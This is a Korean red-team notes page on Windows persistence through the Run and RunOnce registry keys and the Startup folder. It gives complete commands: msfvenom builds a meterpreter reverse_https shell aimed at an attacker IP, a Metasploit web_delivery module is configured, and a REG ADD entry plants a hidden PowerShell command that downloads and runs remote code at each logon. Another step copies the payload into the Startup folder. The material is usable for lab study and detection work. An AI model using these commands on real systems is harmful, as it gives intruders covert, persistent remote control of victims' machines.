# 레지스트리 / 스타트업 폴더

### 레지스트리&#x20;

윈도우의 레지스트리 키 들 중 다음의 키 들은 유저가 로그인 할 시 자동적으로 특정 프로그램/명령어를 실행한다.&#x20;

1. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
2. `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
3. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
4. `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

### 실습&#x20;

레지스트리 키에 원하는 프로그램을 등록시키거나 `cmd.exe /c` 혹은 `powershell -enc -command` 등의 플래그를 이용해 명령어를 실행시키면 된다. 레지스트리 키 추가는 다음의 명령어를 이용한다.&#x20;

```
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v <이름> /t REG_SZ /d <프로그램-경로>
```



#### 레지스트리 + 온디스크 미터프리터&#x20;

```
# 1. 미터프리터 생성 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.40.182 lport=8443 -f exe -o rev.exe

# 2. 리버스쉘을 c:\wow 에 옮기기 

# 3. 타겟의 레지스트리 키 변경 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v <이름> /t REG_SZ /d <프로그램-경>

PS C:\Users\Administrator.CHOI> REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v safestartup /t REG_SZ /d C:\wow\rev.exe
The operation completed successfully.

# 4. 로그오프 후 다시 로그인 -> 리버스쉘 확인 
```

![](<../.gitbook/assets/image (16).png>)

#### 레지스트리 + 인메모리 파워쉘 미터프리터&#x20;

* 파워쉘을 이용한 인메모리 실행을 위해서는 `iex (new-object net.webclient).downloadstring()` 을 이용한다.&#x20;
* 레지스트리 키의 길이 제한은 255자이기 때문에 이에 유의해 레지스트리 키를 생성한다.&#x20;

```
# 1. 메타스플로잇 설정 
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_https
set lhost <ip>
set lport <port>
exploit

# 2. 타겟의 레지스트리 키 변경 - 메타스플로잇의 파워쉘 원라이너 사용 
# #1 번에서 나온 "[*] Using URL: http://192.168.40.182:8080/XXzjZN0FVh" 사용 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v <이름> /t REG_SZ /d "<프로그램-경로>"

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v pshstartup /t REG_SZ /d "c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -w hidden iex(New-Object net.webclient).DownloadString('http://192.168.40.182:8080/XXzjZN0FVh')"

# 3. 로그오프 -> 로그인 후 리버스쉘 확인 
```

![](<../.gitbook/assets/image (5) (1) (2) (2).png>)



### 스타트업 폴더&#x20;

스타트업 폴더는 유저가 로그인 해 세션을 구축할 시 폴더 안의 프로그램을 자동으로 실행시킨다. 공격자들은 스타트업 폴더를 이용해 매번 유저가 로그인 할 때마다 비컨/리버스쉘을 받는 등의 지속성 공격을 실행할 수 있다.&#x20;

스타트업 폴더의 경로는 다음과 같다:&#x20;

* `유저: C:\Users\<유저>\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp`&#x20;
* `시스템: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

로컬 관리자 권한을 갖고 있다면 시스템 스타트업 폴더를 이용할 수 있다. 여기서 실행되는 프로세스들은 어떤 유저가 로그인 하던간에 실행된다.&#x20;

### 실습&#x20;

미터프리터를 생성한 뒤, 타겟 호스트의 스타트업 폴더에 미터프리터 파일을 옮긴다. 그 후 로그오프 -> 로그인을 해서 리버스쉘이 도착하는지 확인한다.&#x20;

```
# 1. 미터프리터 생성 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.40.182 lport=8443 -f exe -o rev.exe

# 2. 미터프리터 타겟 호스트로 전송 

# 3. 타겟 호스트에서 미터프리터를 스타트업 폴더로 복사 
cp <미터프리터 경로> 'C:\Users\<유저-이름>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'

4. 로그오프 -> 로그인 후 리버스쉘 확인 
```

### 레퍼런스&#x20;

{% embed url="https://www.elastic.co/guide/en/security/current/startup-folder-persistence-via-unsigned-process.html" %}

{% embed url="https://labs.withsecure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-2/" %}

{% embed url="https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder" %}

<details>

<summary>추가 리서치 - todo </summary>

```
다음 레지스트리 키 들은 스타트업 폴더의 경로를 바꿀 수 있다. 윈도우의 기본 스타트업 폴더 경로가 아니라 다른 폴더 경로를 스타트업 폴더로 바꾸고 싶을 때 이 레지스트리에 값들을 추가한다.
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

</details>
